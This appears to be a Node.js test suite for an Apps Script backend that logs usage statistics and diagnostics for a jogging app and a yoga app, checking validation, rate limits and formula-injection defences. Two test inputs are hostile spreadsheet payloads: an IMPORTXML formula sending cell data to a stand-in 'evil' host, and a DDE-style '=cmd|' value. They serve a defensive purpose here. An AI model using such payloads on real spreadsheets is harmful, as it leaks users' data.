// 用法：node apps-script/Code.test.js
// 用模擬的 Apps Script 環境測 Code.gs：統計路徑不變、診斷路徑寫進另一個分頁、防公式與防灌水
const fs = require('fs'), vm = require('vm'), assert = require('assert');
// 模擬環境（vm）裡建立的陣列和這裡的 Array 不是同一個 realm，deepStrictEqual 會誤判，所以用 JSON 比對
const same = (a, b) => assert.strictEqual(JSON.stringify(a), JSON.stringify(b));
function makeEnv() {
  const sheets = [];
  const mkSheet = (name) => ({ name, rows: [], appendRow(r) { this.rows.push(r); }, getLastRow() { return this.rows.length; }, getDataRange() { return { getValues: () => this.rows }; } });
  sheets.push(mkSheet('Sheet1')); sheets[0].rows.push(['時間', '作品', '課程', '小時']);
  const ss = { getSheets: () => sheets, getSheetByName: (n) => sheets.find((s) => s.name === n) || null,
    insertSheet(n, idx) { const s = mkSheet(n); sheets.splice(idx, 0, s); return s; }, getNumSheets: () => sheets.length };
  const cache = {}; 
  const env = {
    SpreadsheetApp: { getActiveSpreadsheet: () => ss },
    CacheService: { getScriptCache: () => ({ get: (k) => cache[k] ?? null, put: (k, v) => { cache[k] = v; }, remove: (k) => { delete cache[k]; } }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    ContentService: { MimeType: { JSON: 'json' }, createTextOutput: (t) => ({ t, setMimeType() { return this; } }) },
    Utilities: { formatDate: () => '2026-11-01' },
    console,
  };
  vm.createContext(env);
  vm.runInContext(fs.readFileSync(require('path').join(__dirname, 'Code.gs'), 'utf8') + '\nthis.__doPost = doPost; this.__doGet = doGet;', env);
  return { env, sheets, post: (obj) => JSON.parse(env.__doPost({ postData: { contents: JSON.stringify(obj) } }).t),
    stats: () => JSON.parse(env.__doGet().t) };
}
let t = 0; const ok = (name, fn) => { fn(); t++; console.log('✓', name); };

ok('統計：原本的作法不變，寫進第一個分頁，不會建立診斷分頁', () => {
  const { sheets, post } = makeEnv();
  same(post({ app: 'slowjog', course: '', hour: 12 }), { ok: true });
  assert.strictEqual(sheets.length, 1); assert.strictEqual(sheets[0].rows.length, 2);
  same(post({ app: 'night-yoga', course: 'quick', hour: 0 }), { ok: true });
});
ok('統計：SlowJog Android 與網頁版分開記，也只收課程欄空白、小時 0 到 23', () => {
  const { sheets, post } = makeEnv();
  same(post({ app: 'slowjog-android', course: '', hour: 6 }), { ok: true });
  assert.strictEqual(sheets[0].rows[1][1], 'slowjog-android');
  assert.strictEqual(post({ app: 'slowjog-android', course: 'quick', hour: 6 }).ok, false, 'Android 沒有固定課程');
  assert.strictEqual(post({ app: 'slowjog-android', course: '', hour: 24 }).ok, false);
  assert.strictEqual(post({ app: 'slowjog-android-evil', course: '', hour: 1 }).ok, false);
});
ok('統計：未知作品、錯的小時照樣被拒絕', () => {
  const { post } = makeEnv();
  assert.strictEqual(post({ app: 'evil', course: '', hour: 1 }).ok, false);
  assert.strictEqual(post({ app: 'slowjog', course: '', hour: 99 }).ok, false);
});
ok('統計：晚安瑜伽收 quick／standard／deep 與已上線的 lying-01、lying-03，其他課程代號一律拒絕', () => {
  const { sheets, post } = makeEnv();
  ['quick', 'standard', 'deep', 'lying-01', 'lying-03'].forEach((c) => same(post({ app: 'night-yoga', course: c, hour: 22 }), { ok: true }));
  assert.strictEqual(sheets[0].rows.length, 1 + 5);
  assert.strictEqual(sheets[0].rows[4][2], 'lying-01');
  assert.strictEqual(sheets[0].rows[5][2], 'lying-03');
  // 還沒上線的課程（lying-02 還沒做）、格式不對的、大小寫或空白不同的、空的，都不收
  ['lying-02', 'lying-04', 'lying-99', 'lying-', 'lying-01 ', 'lying-03 ', 'LYING-03', ''].forEach((c) =>
    assert.strictEqual(post({ app: 'night-yoga', course: c, hour: 22 }).ok, false, '不該收：' + JSON.stringify(c)));
  assert.strictEqual(sheets[0].rows.length, 6, '被拒絕的不會寫進試算表');
});
ok('統計：lying- 課程只算晚安瑜伽的課程，SlowJog 不能用', () => {
  const { post } = makeEnv();
  ['lying-01', 'lying-03'].forEach((c) => {
    assert.strictEqual(post({ app: 'slowjog', course: c, hour: 1 }).ok, false);
    assert.strictEqual(post({ app: 'slowjog-android', course: c, hour: 1 }).ok, false);
  });
});
ok('統計：統計頁讀到的資料，lying-01、lying-03 會被算進晚安瑜伽的課程排行，沒人做過時是 0', () => {
  const { post, stats } = makeEnv();
  same(stats().apps['night-yoga'].byCourse, { quick: 0, standard: 0, deep: 0, 'lying-01': 0, 'lying-03': 0 });
  post({ app: 'night-yoga', course: 'lying-01', hour: 23 });
  post({ app: 'night-yoga', course: 'lying-01', hour: 22 });
  post({ app: 'night-yoga', course: 'lying-03', hour: 22 });
  post({ app: 'night-yoga', course: 'quick', hour: 22 });
  const a = stats().apps['night-yoga'];
  same(a.byCourse, { quick: 1, standard: 0, deep: 0, 'lying-01': 2, 'lying-03': 1 });
  assert.strictEqual(a.total, 4);
});
ok('診斷：寫進最後面的「診斷紀錄」分頁，第一個分頁仍是統計', () => {
  const { sheets, post } = makeEnv();
  same(post({ type: 'diag', run: 'AB12', page: 'bg-audio-test.html', text: '[00:03] 節拍開始' }), { ok: true });
  assert.strictEqual(sheets.length, 2);
  assert.strictEqual(sheets[0].name, 'Sheet1', '統計分頁不能被擠到後面');
  assert.strictEqual(sheets[1].name, '診斷紀錄');
  same(sheets[1].rows[0], ['時間', '測試代號', '頁面', '內容']);
  assert.strictEqual(sheets[1].rows[1][1], 'AB12');
  assert.strictEqual(sheets[1].rows[1][3], '> [00:03] 節拍開始');
  assert.strictEqual(sheets[0].rows.length, 1, '統計分頁沒有被多寫');
});
ok('診斷：以「=」開頭的內容不會變成試算表公式（IMPORTXML 之類）', () => {
  const { sheets, post } = makeEnv();
  post({ type: 'diag', run: 'X', page: 'p', text: '=IMPORTXML("http://evil/?x="&A1,"//a")' });
  assert.ok(sheets[1].rows[1][3].startsWith('> ='), '前面固定有「> 」');
  assert.ok(!String(sheets[1].rows[1][3]).startsWith('='));
});
ok('診斷：測試代號與頁面只留英數字、內容超長會截斷、缺資料被拒絕', () => {
  const { sheets, post } = makeEnv();
  post({ type: 'diag', run: '=cmd|x;<b>', page: '../a b', text: 'x'.repeat(9000) });
  assert.strictEqual(sheets[1].rows[1][1], 'cmdxb'); // =cmd|x;<b> 去掉符號後只剩英數字
  assert.strictEqual(sheets[1].rows[1][2], '..ab');
  assert.strictEqual(sheets[1].rows[1][3].length, 2 + 4000);
  assert.strictEqual(post({ type: 'diag', run: '', text: 'x' }).ok, false);
  assert.strictEqual(post({ type: 'diag', run: 'A', text: '' }).ok, false);
});
ok('診斷：每分鐘超過上限就停止收（防灌水）', () => {
  const { post } = makeEnv();
  let accepted = 0; for (let i = 0; i < 80; i++) if (post({ type: 'diag', run: 'R', text: 't' + i }).ok) accepted++;
  assert.strictEqual(accepted, 60);
});
ok('診斷：分頁滿了就停止收', () => {
  const { sheets, post } = makeEnv();
  post({ type: 'diag', run: 'R', text: 'first' });
  for (let i = 0; i < 3000; i++) sheets[1].rows.push(['x']);
  const r = post({ type: 'diag', run: 'R', text: 'overflow' });
  same(r, { ok: false, error: 'full' });
});
console.log('\n全部 ' + t + ' 項通過');
